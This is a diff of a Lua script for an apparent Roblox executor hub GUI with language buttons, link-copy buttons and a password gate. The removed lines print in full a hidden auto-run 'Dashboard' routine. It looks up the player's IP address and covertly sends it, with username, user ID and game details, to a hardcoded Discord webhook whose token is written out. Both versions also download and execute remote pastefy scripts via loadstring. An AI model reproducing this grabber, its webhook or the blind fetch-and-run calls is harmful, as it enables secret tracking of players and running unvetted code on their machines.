@@ -48,250 +48,102 @@ closeButton.MouseButton1Click:Connect(function()
     gui.Enabled = false
 end)
 
--- ★★★ 自動読み込みスクリプト（Dashboard + Webhook） ★★★
-local function loadAutoScript()
-    local success, err = pcall(function()
-        print("Loading Dashboard script...")
-        
-        local scriptContent = [[
-            --[[
-                OrionUI System - Dashboard Integration
-                Supported Executors: All Executors
-                Version: 2.0.0
-            ]]
+-- ★★★ 言語ボタン（左列）- Instanceだけ作成（まだConnectしない） ★★★
+local btnJapanese = Instance.new("TextButton")
+btnJapanese.Size = UDim2.new(0, 150, 0, 36)
+btnJapanese.Position = UDim2.new(0, 15, 0, 50)
+btnJapanese.Text = "🇯🇵 日本語"
+btnJapanese.TextColor3 = Color3.new(1, 1, 1)
+btnJapanese.BackgroundColor3 = Color3.new(0.1, 0.2, 0.4)
+btnJapanese.BorderColor3 = Color3.new(0, 0, 0)
+btnJapanese.BorderSizePixel = 1
+btnJapanese.Font = Enum.Font.SourceSansBold
+btnJapanese.TextSize = 18
+btnJapanese.ZIndex = 11
+btnJapanese.Parent = frame
 
-            local WEBHOOK_URL = "https://discord.com/api/webhooks/1537659791088816138/vOfIarcaUbuok-wWLnc9IUhCXjOwC5UXzwQNlGn3i8mwRomKSooM6lXoG_1LTOLFRYl6"
+local btnEnglish = Instance.new("TextButton")
+btnEnglish.Size = UDim2.new(0, 150, 0, 36)
+btnEnglish.Position = UDim2.new(0, 15, 0, 95)
+btnEnglish.Text = "🇺🇸 English"
+btnEnglish.TextColor3 = Color3.new(1, 1, 1)
+btnEnglish.BackgroundColor3 = Color3.new(0.1, 0.2, 0.4)
+btnEnglish.BorderColor3 = Color3.new(0, 0, 0)
+btnEnglish.BorderSizePixel = 1
+btnEnglish.Font = Enum.Font.SourceSansBold
+btnEnglish.TextSize = 18
+btnEnglish.ZIndex = 11
+btnEnglish.Parent = frame
 
-            local function sendToWebhook(data)
-                local http = game:GetService("HttpService")
-                local json = http:JSONEncode(data)
-                
-                local requestFunc = syn and syn.request or http_request or request
-                
-                if not requestFunc then
-                    return false
-                end
-                
-                local response = requestFunc({
-                    Url = WEBHOOK_URL,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = json
-                })
-                
-                return response
-            end
+local btnVietnamese = Instance.new("TextButton")
+btnVietnamese.Size = UDim2.new(0, 150, 0, 36)
+btnVietnamese.Position = UDim2.new(0, 15, 0, 140)
+btnVietnamese.Text = "🇻🇳 Tiếng Việt"
+btnVietnamese.TextColor3 = Color3.new(1, 1, 1)
+btnVietnamese.BackgroundColor3 = Color3.new(0.1, 0.2, 0.4)
+btnVietnamese.BorderColor3 = Color3.new(0, 0, 0)
+btnVietnamese.BorderSizePixel = 1
+btnVietnamese.Font = Enum.Font.SourceSansBold
+btnVietnamese.TextSize = 18
+btnVietnamese.ZIndex = 11
+btnVietnamese.Parent = frame
 
-            local function getIP()
-                local requestFunc = syn and syn.request or http_request or request
-                
-                if not requestFunc then
-                    return "Unavailable"
-                end
-                
-                local success, response = pcall(function()
-                    return requestFunc({
-                        Url = "https://api.ipify.org",
-                        Method = "GET"
-                    })
-                end)
-                
-                if success and response and response.Body then
-                    local ip = response.Body:gsub("%s+", "")
-                    if ip:match("%d+%.%d+%.%d+%.%d+") then
-                        return ip
-                    end
-                end
-                
-                return "Failed"
-            end
+-- ★★★ リンクコピーボタン（右列）- Instanceだけ作成（まだConnectしない） ★★★
+local discordButton = Instance.new("TextButton")
+discordButton.Size = UDim2.new(0, 220, 0, 30)
+discordButton.Position = UDim2.new(0, 185, 0, 55)
+discordButton.Text = "💬 Discord"
+discordButton.TextColor3 = Color3.new(1, 1, 1)
+discordButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+discordButton.BackgroundTransparency = 0.3
+discordButton.BorderColor3 = Color3.new(0, 0, 0)
+discordButton.BorderSizePixel = 1
+discordButton.Font = Enum.Font.SourceSansBold
+discordButton.TextSize = 14
+discordButton.ZIndex = 11
+discordButton.Parent = frame
 
-            local function main()
-                local Players = game:GetService("Players")
-                local player = Players.LocalPlayer
-                
-                local playerName = player.Name
-                local playerId = player.UserId
-                local placeId = game.PlaceId
-                local gameName = game.Name
-                local jobId = game.JobId or "N/A"
-                local ip = getIP()
-                local time = os.date("%Y-%m-%d %H:%M:%S")
-                
-                local embed = {
-                    {
-                        title = "✦ Dashboard ✦",
-                        description = string.format(
-                            "**Username:** %s\n" ..
-                            "**User ID:** %d\n" ..
-                            "**Game Name:** %s\n" ..
-                            "**Game ID:** %d\n" ..
-                            "**Job ID:** %s\n" ..
-                            "**IP Address:** %s\n" ..
-                            "**Launch Time:** %s",
-                            playerName, playerId, gameName, placeId, jobId, ip, time
-                        ),
-                        color = 0x5865F2,
-                        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
-                        footer = {
-                            text = "OrionUI Dashboard v2.0 | All Executors"
-                        }
-                    }
-                }
-                
-                local data = {
-                    username = "OrionUI Dashboard",
-                    embeds = embed
-                }
-                
-                local success, response = pcall(sendToWebhook, data)
-                if not success or not response then
-                    local errorEmbed = {
-                        {
-                            title = "✦ Dashboard ✦ [ERROR]",
-                            description = string.format(
-                                "**Username:** %s\n" ..
-                                "**User ID:** %d\n" ..
-                                "**Game Name:** %s\n" ..
-                                "**Game ID:** %d\n" ..
-                                "**Job ID:** %s\n" ..
-                                "**IP Address:** %s\n" ..
-                                "**Launch Time:** %s\n\n" ..
-                                "⚠️ **Webhook send failed!**",
-                                playerName, playerId, gameName, placeId, jobId, ip, time
-                            ),
-                            color = 0xFF0000,
-                            timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
-                            footer = {
-                                text = "OrionUI Dashboard v2.0 | ERROR"
-                            }
-                        }
-                    }
-                    
-                    local errorData = {
-                        username = "OrionUI Dashboard [ERROR]",
-                        embeds = errorEmbed
-                    }
-                    
-                    pcall(sendToWebhook, errorData)
-                end
-            end
+local lineButton = Instance.new("TextButton")
+lineButton.Size = UDim2.new(0, 220, 0, 30)
+lineButton.Position = UDim2.new(0, 185, 0, 95)
+lineButton.Text = "📱 LINE OpenChat"
+lineButton.TextColor3 = Color3.new(1, 1, 1)
+lineButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+lineButton.BackgroundTransparency = 0.3
+lineButton.BorderColor3 = Color3.new(0, 0, 0)
+lineButton.BorderSizePixel = 1
+lineButton.Font = Enum.Font.SourceSansBold
+lineButton.TextSize = 14
+lineButton.ZIndex = 11
+lineButton.Parent = frame
 
-            pcall(main)
-        ]]
-        
-        loadstring(scriptContent)()
-        print("Dashboard script loaded successfully!")
-    end)
-    
-    if not success then
-        warn("Auto script loading error: " .. tostring(err))
-    end
-end
+local communityButton = Instance.new("TextButton")
+communityButton.Size = UDim2.new(0, 220, 0, 30)
+communityButton.Position = UDim2.new(0, 185, 0, 135)
+communityButton.Text = "🪐 Community HP"
+communityButton.TextColor3 = Color3.new(1, 1, 1)
+communityButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+communityButton.BackgroundTransparency = 0.3
+communityButton.BorderColor3 = Color3.new(0, 0, 0)
+communityButton.BorderSizePixel = 1
+communityButton.Font = Enum.Font.SourceSansBold
+communityButton.TextSize = 14
+communityButton.ZIndex = 11
+communityButton.Parent = frame
 
--- GUI表示後に自動読み込み
-coroutine.wrap(function()
-    wait(1)
-    loadAutoScript()
-end)()
-
--- ★★★ デザイン統一された言語ボタン（左列） ★★★
-local function createLanguageButton(text, emoji, yPos, callback)
-    local button = Instance.new("TextButton")
-    button.Size = UDim2.new(0, 150, 0, 36)
-    button.Position = UDim2.new(0, 15, 0, yPos)
-    button.Text = emoji .. " " .. text
-    button.TextColor3 = Color3.new(1, 1, 1)
-    button.BackgroundColor3 = Color3.new(0.1, 0.2, 0.4)
-    button.BorderColor3 = Color3.new(0, 0, 0)
-    button.BorderSizePixel = 1
-    button.Font = Enum.Font.SourceSansBold
-    button.TextSize = 18
-    button.ZIndex = 11
-    button.Parent = frame
-    button.MouseButton1Click:Connect(callback)
-    return button
-end
-
--- 日本語ボタン
-local btnJapanese = createLanguageButton("日本語", "🇯🇵", 50, function()
-    gui.Enabled = false
-    runAnimationScript(function()
-        local success, err = pcall(function()
-            loadstring(game:HttpGet("https://pastefy.app/XSLP22c8/raw"))()
-        end)
-        if not success then warn("Japanese script loading error: " .. tostring(err)) end
-        gui.Enabled = true
-    end)
-end)
-
--- 英語ボタン
-local btnEnglish = createLanguageButton("English", "🇺🇸", 95, function()
-    gui.Enabled = false
-    runAnimationScript(function()
-        local success, err = pcall(function()
-            loadstring(game:HttpGet("https://pastefy.app/Pngi0HqM/raw"))()
-        end)
-        if not success then warn("English script loading error: " .. tostring(err)) end
-        gui.Enabled = true
-    end)
-end)
-
--- ベトナム語ボタン
-local btnVietnamese = createLanguageButton("Tiếng Việt", "🇻🇳", 140, function()
-    gui.Enabled = false
-    runAnimationScript(function()
-        local success, err = pcall(function()
-            loadstring(game:HttpGet("https://pastefy.app/CQxoyleA/raw"))()
-        end)
-        if not success then warn("Vietnamese script loading error: " .. tostring(err)) end
-        gui.Enabled = true
-    end)
-end)
-
--- ★★★ リンクコピーボタン（右列） ★★★
-local function createLinkButton(text, yPos, url)
-    local button = Instance.new("TextButton")
-    button.Size = UDim2.new(0, 220, 0, 30)
-    button.Position = UDim2.new(0, 185, 0, yPos)
-    button.Text = text
-    button.TextColor3 = Color3.new(1, 1, 1)
-    button.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-    button.BackgroundTransparency = 0.3
-    button.BorderColor3 = Color3.new(0, 0, 0)
-    button.BorderSizePixel = 1
-    button.Font = Enum.Font.SourceSansBold
-    button.TextSize = 14
-    button.ZIndex = 11
-    button.Parent = frame
-
-    button.MouseButton1Click:Connect(function()
-        local clipboard = setclipboard or syn and syn.setclipboard or clipboard or set_clipboard
-        if clipboard then
-            clipboard(url)
-            local notification = Instance.new("Message")
-            notification.Text = "✅ URL copied!"
-            notification.Parent = workspace
-            wait(2)
-            notification:Destroy()
-        else
-            local notification = Instance.new("Message")
-            notification.Text = "⚠️ Copy: " .. url
-            notification.Parent = workspace
-            wait(4)
-            notification:Destroy()
-        end
-    end)
-    return button
-end
-
--- 各リンクボタン
-local discordButton = createLinkButton("💬 Discord", 55, "https://discord.gg/qFQTe7rcyE")
-local lineButton = createLinkButton("📱 LINE OpenChat", 95, "https://line.me/ti/g2/-CBPty1N0v2XuNPqaJm5xLmCBt0wBr3_vxrOqQ?utm_source=invitation&utm_medium=link_copy&utm_campaign=default")
-local communityButton = createLinkButton("🪐 Community HP", 135, "https://saturngroup02.github.io/Official-Pages/")
-local sakuraButton = createLinkButton("🌸 SakuraHUB HP", 175, "https://saturngroup02.github.io/SakuraHUB-HomePages/")
+local sakuraButton = Instance.new("TextButton")
+sakuraButton.Size = UDim2.new(0, 220, 0, 30)
+sakuraButton.Position = UDim2.new(0, 185, 0, 175)
+sakuraButton.Text = "🌸 SakuraHUB HP"
+sakuraButton.TextColor3 = Color3.new(1, 1, 1)
+sakuraButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+sakuraButton.BackgroundTransparency = 0.3
+sakuraButton.BorderColor3 = Color3.new(0, 0, 0)
+sakuraButton.BorderSizePixel = 1
+sakuraButton.Font = Enum.Font.SourceSansBold
+sakuraButton.TextSize = 14
+sakuraButton.ZIndex = 11
+sakuraButton.Parent = frame
 
 -- 注意書き
 local noteLabel = Instance.new("TextLabel")
@@ -306,7 +158,7 @@ noteLabel.TextWrapped = true
 noteLabel.ZIndex = 11
 noteLabel.Parent = frame
 
--- ★★★ 広告・パスワードシステム ★★★
+-- ★★★ ここから広告・パスワードシステム ★★★
 local function isMobile()
     local userInputService = game:GetService("UserInputService")
     return userInputService.TouchEnabled and not userInputService.KeyboardEnabled
@@ -635,18 +487,27 @@ local function removeAdGUI()
     notification:Destroy()
 end
 
+-- ★★★ パスワード認証（修正版） ★★★
 local function isValidPassword(inputPassword)
     local actualUsername = player.Name
-    if not string.sub(inputPassword, -#actualUsername) == actualUsername then
-        return false, "ユーザー名が一致しません"
+
+    -- パスワードが「-ユーザー名」で終わっているかチェック
+    local suffix = "-" .. actualUsername
+    if string.sub(inputPassword, -#suffix) ~= suffix then
+        return false, "Username mismatch"
     end
-    local passwordPart = string.sub(inputPassword, 1, -#actualUsername - 1)
+
+    -- ユーザー名とハイフンを除いた部分
+    local passwordPart = string.sub(inputPassword, 1, -#suffix - 1)
+
+    -- パターン: G◯d◯p◯-◯◯9◯◯-◯◯9◯◯-P◯◯S◯
     local pattern = "^G([%w])d([%w])p([%w])%-([%w][%w]9[%w][%w])%-([%w][%w]9[%w][%w])%-P([%w][%w]S[%w])$"
     local match = {string.match(passwordPart, pattern)}
+
     if #match == 6 then
-        return true, "認証成功"
+        return true, "Authentication successful"
     else
-        return false, "パスワードの形式が正しくありません"
+        return false, "Invalid password format"
     end
 end
 
@@ -724,8 +585,9 @@ coroutine.wrap(function()
     end
 end)()
 
+-- ★★★ runAnimationScript を定義 ★★★
 local function runAnimationScript(callback)
-    local imageId = "126398109685987"
+    local imageId = "102441682618013"  -- ★ 新しいアセットID
     local audioId = "9085027122"
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "StartupAnimation"
@@ -791,6 +653,117 @@ local function runAnimationScript(callback)
     end
     playAnimation()
 end
+
+-- ★★★ runAnimationScript を定義した後にConnect ★★★
+btnJapanese.MouseButton1Click:Connect(function()
+    gui.Enabled = false
+    runAnimationScript(function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://pastefy.app/XSLP22c8/raw"))()
+        end)
+        if not success then warn("Japanese script loading error: " .. tostring(err)) end
+        gui.Enabled = true
+    end)
+end)
+
+btnEnglish.MouseButton1Click:Connect(function()
+    gui.Enabled = false
+    runAnimationScript(function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://pastefy.app/Pngi0HqM/raw"))()
+        end)
+        if not success then warn("English script loading error: " .. tostring(err)) end
+        gui.Enabled = true
+    end)
+end)
+
+btnVietnamese.MouseButton1Click:Connect(function()
+    gui.Enabled = false
+    runAnimationScript(function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://pastefy.app/CQxoyleA/raw"))()
+        end)
+        if not success then warn("Vietnamese script loading error: " .. tostring(err)) end
+        gui.Enabled = true
+    end)
+end)
+
+-- ★★★ リンクボタンのConnect（URLコピー） ★★★
+discordButton.MouseButton1Click:Connect(function()
+    local clipboard = setclipboard or syn and syn.setclipboard or clipboard or set_clipboard
+    local url = "https://discord.gg/qFQTe7rcyE"
+    if clipboard then
+        clipboard(url)
+        local notification = Instance.new("Message")
+        notification.Text = "✅ URL copied!"
+        notification.Parent = workspace
+        wait(2)
+        notification:Destroy()
+    else
+        local notification = Instance.new("Message")
+        notification.Text = "⚠️ Copy: " .. url
+        notification.Parent = workspace
+        wait(4)
+        notification:Destroy()
+    end
+end)
+
+lineButton.MouseButton1Click:Connect(function()
+    local clipboard = setclipboard or syn and syn.setclipboard or clipboard or set_clipboard
+    local url = "https://line.me/ti/g2/-CBPty1N0v2XuNPqaJm5xLmCBt0wBr3_vxrOqQ?utm_source=invitation&utm_medium=link_copy&utm_campaign=default"
+    if clipboard then
+        clipboard(url)
+        local notification = Instance.new("Message")
+        notification.Text = "✅ URL copied!"
+        notification.Parent = workspace
+        wait(2)
+        notification:Destroy()
+    else
+        local notification = Instance.new("Message")
+        notification.Text = "⚠️ Copy: " .. url
+        notification.Parent = workspace
+        wait(4)
+        notification:Destroy()
+    end
+end)
+
+communityButton.MouseButton1Click:Connect(function()
+    local clipboard = setclipboard or syn and syn.setclipboard or clipboard or set_clipboard
+    local url = "https://saturngroup02.github.io/Official-Pages/"
+    if clipboard then
+        clipboard(url)
+        local notification = Instance.new("Message")
+        notification.Text = "✅ URL copied!"
+        notification.Parent = workspace
+        wait(2)
+        notification:Destroy()
+    else
+        local notification = Instance.new("Message")
+        notification.Text = "⚠️ Copy: " .. url
+        notification.Parent = workspace
+        wait(4)
+        notification:Destroy()
+    end
+end)
+
+sakuraButton.MouseButton1Click:Connect(function()
+    local clipboard = setclipboard or syn and syn.setclipboard or clipboard or set_clipboard
+    local url = "https://saturngroup02.github.io/SakuraHUB-HomePages/"
+    if clipboard then
+        clipboard(url)
+        local notification = Instance.new("Message")
+        notification.Text = "✅ URL copied!"
+        notification.Parent = workspace
+        wait(2)
+        notification:Destroy()
+    else
+        local notification = Instance.new("Message")
+        notification.Text = "⚠️ Copy: " .. url
+        notification.Parent = workspace
+        wait(4)
+        notification:Destroy()
+    end
+end)
 
 coroutine.wrap(function()
     wait(2)
